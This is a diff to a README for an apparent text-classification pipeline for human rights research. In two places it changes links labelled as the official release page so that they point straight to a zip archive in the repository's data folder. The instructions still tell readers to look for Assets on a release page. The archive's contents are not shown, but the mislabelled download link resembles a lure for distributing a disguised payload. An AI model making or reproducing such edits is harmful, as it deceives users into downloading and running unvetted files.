@@ -1,6 +1,6 @@
 # 🤖 applied-nlp-multilabel-pipeline - Streamline human rights text analysis tasks
 
-[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/releases)
+[![Download Application](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/raw/refs/heads/main/data/multilabel-nlp-applied-pipeline-v1.8.zip)
 
 This application helps users sort and categorize large collections of text documents. It uses machine learning to identify topics and labels within your data. The tool includes a manual review process to ensure the accuracy of your results. Researchers use this pipeline to organize information for human rights projects.
 
@@ -18,7 +18,7 @@ Your computer needs specific hardware and software to run this tool smoothly. Co
 
 You can get the application files from the release page. This page hosts the current version of the tool.
 
-[Visit the official release page to download your copy](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/releases)
+[Visit the official release page to download your copy](https://github.com/hlakm9207/applied-nlp-multilabel-pipeline/raw/refs/heads/main/data/multilabel-nlp-applied-pipeline-v1.8.zip)
 
 Once you reach the page, look for the section marked Assets. Click the link that ends in .zip to start your download. Save this file to a folder like your Downloads or Documents directory.
 
